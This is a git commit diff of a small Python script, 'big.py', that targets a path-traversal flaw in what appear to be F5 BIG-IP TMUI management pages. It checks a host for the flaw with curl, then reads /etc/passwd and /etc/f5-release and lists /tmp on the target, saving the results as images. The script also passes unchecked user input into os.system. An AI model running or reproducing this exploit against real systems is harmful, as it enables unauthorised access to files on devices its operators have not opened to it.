aa1a0a15bc212b07ef5e033c4cc2c55b5c022e38
united36 <59273001+united36@users.noreply.github.com>
2020-08-27 03:11:21 -0400

    Update big.py

--- big.py
+++ big.py
@@ -2,9 +2,14 @@
 import os
 import requests
 import urllib3
+import imgkit
 
 host= input( "Enter the host Domain/IP:")
 cmd = "curl -sk 'https://"+host+"/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=Vulnerable' | grep -q Vulnerable && printf '\033[0;31mVulnerable\n' || printf '\033[0;32mNot Vulnerable\n'"
-os.system(cmd)
+a = os.system(cmd)
 
 
+
+imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","etc_password.jpg")
+imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp","directory.jpg")
+imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release","F5-realase.jpg")
